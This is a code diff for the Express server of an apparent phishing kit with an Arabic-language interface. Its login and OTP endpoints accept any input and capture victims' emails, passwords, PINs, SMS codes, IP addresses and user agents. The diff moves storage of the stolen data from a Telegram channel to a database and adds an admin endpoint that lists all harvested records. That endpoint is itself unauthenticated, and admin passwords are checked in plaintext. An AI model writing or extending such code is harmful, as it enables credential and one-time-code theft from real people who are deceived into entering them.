@@ -1,40 +1,50 @@
-import type { Express } from "express";
+import type { Express, Request } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
-import { loginSchema, verifyOtpSchema } from "@shared/schema";
-import { sendToTelegram, formatLoginMessage, formatSMSMessage } from "./telegram";
+import { loginSchema, verifyOtpSchema, adminLoginSchema } from "@shared/schema";
 
-// Store temporary data (email and SMS codes) for users
-const tempUserData = new Map<string, { email: string; password: string; pin: string }>();
+// Store temporary collected data IDs for SMS verification
+const tempCollectedIds = new Map<string, string>();
 
-function generateUserId(): string {
-  return `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+function getClientIp(req: Request): string {
+  const forwarded = req.headers['x-forwarded-for'];
+  if (typeof forwarded === 'string') {
+    return forwarded.split(',')[0].trim();
+  }
+  return req.socket.remoteAddress || 'unknown';
 }
 
 export async function registerRoutes(app: Express): Promise<Server> {
   
-  // Login endpoint - accepts ANY credentials
+  // Login endpoint - accepts ANY credentials and saves to database
   app.post("/api/auth/login", async (req, res) => {
     try {
       const validatedData = loginSchema.parse(req.body);
       const { email, password, pin } = validatedData;
 
-      // Generate unique user ID
-      const userId = generateUserId();
+      const ipAddress = getClientIp(req);
+      const userAgent = req.headers['user-agent'] || 'unknown';
 
-      // Store user data temporarily
-      tempUserData.set(userId, { email, password, pin });
+      // Save collected data to database
+      const collectedDataRecord = await storage.createCollectedData({
+        email,
+        password,
+        pin,
+        smsCode: null,
+        ipAddress,
+        userAgent,
+      });
 
-      // Send login data to Telegram
-      const telegramMessage = formatLoginMessage(email, password, pin);
-      await sendToTelegram(telegramMessage);
+      // Store the collected data ID temporarily for SMS verification
+      const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+      tempCollectedIds.set(sessionId, collectedDataRecord.id);
 
-      console.log(`✅ Login data sent to Telegram for: ${email}`);
+      console.log(`✅ Login data saved to database for: ${email}`);
 
       // Always return success
       res.json({ 
         success: true, 
-        userId: userId,
+        userId: sessionId,
         message: "تم إرسال رمز التحقق إلى هاتفك" 
       });
     } catch (error: any) {
@@ -43,27 +53,26 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Verify OTP endpoint - accepts ANY SMS code
+  // Verify OTP endpoint - accepts ANY SMS code and saves to database
   app.post("/api/auth/verify-otp", async (req, res) => {
     try {
       const validatedData = verifyOtpSchema.parse(req.body);
       const { userId, otp } = validatedData;
 
-      // Get user data
-      const userData = tempUserData.get(userId);
+      // Get collected data ID
+      const collectedDataId = tempCollectedIds.get(userId);
       
-      if (!userData) {
+      if (!collectedDataId) {
         return res.status(401).json({ message: "الجلسة منتهية، يرجى تسجيل الدخول مجدداً" });
       }
 
-      // Send SMS code to Telegram
-      const telegramMessage = formatSMSMessage(userData.email, otp);
-      await sendToTelegram(telegramMessage);
+      // Update collected data with SMS code
+      await storage.updateCollectedDataSms(collectedDataId, otp);
 
-      console.log(`✅ SMS code sent to Telegram for: ${userData.email} - Code: ${otp}`);
+      console.log(`✅ SMS code saved to database - Code: ${otp}`);
 
-      // Clean up temporary data
-      tempUserData.delete(userId);
+      // Clean up temporary session
+      tempCollectedIds.delete(userId);
 
       // Always return success
       res.json({ 
@@ -73,6 +82,43 @@ export async function registerRoutes(app: Express): Promise<Server> {
     } catch (error: any) {
       console.error("OTP verification error:", error);
       res.status(400).json({ message: error.message || "خطأ في التحقق" });
+    }
+  });
+
+  // Admin login endpoint
+  app.post("/api/admin/login", async (req, res) => {
+    try {
+      const validatedData = adminLoginSchema.parse(req.body);
+      const { username, password } = validatedData;
+
+      const admin = await storage.getAdminByUsername(username);
+      
+      if (!admin || admin.password !== password) {
+        return res.status(401).json({ message: "اسم المستخدم أو كلمة المرور غير صحيحة" });
+      }
+
+      res.json({ 
+        success: true,
+        admin: {
+          id: admin.id,
+          username: admin.username,
+          role: admin.role,
+        }
+      });
+    } catch (error: any) {
+      console.error("Admin login error:", error);
+      res.status(400).json({ message: error.message || "خطأ في تسجيل الدخول" });
+    }
+  });
+
+  // Get all collected data (admin only)
+  app.get("/api/admin/collected-data", async (req, res) => {
+    try {
+      const data = await storage.getAllCollectedData();
+      res.json({ success: true, data });
+    } catch (error: any) {
+      console.error("Error fetching collected data:", error);
+      res.status(500).json({ message: "خطأ في جلب البيانات" });
     }
   });
 
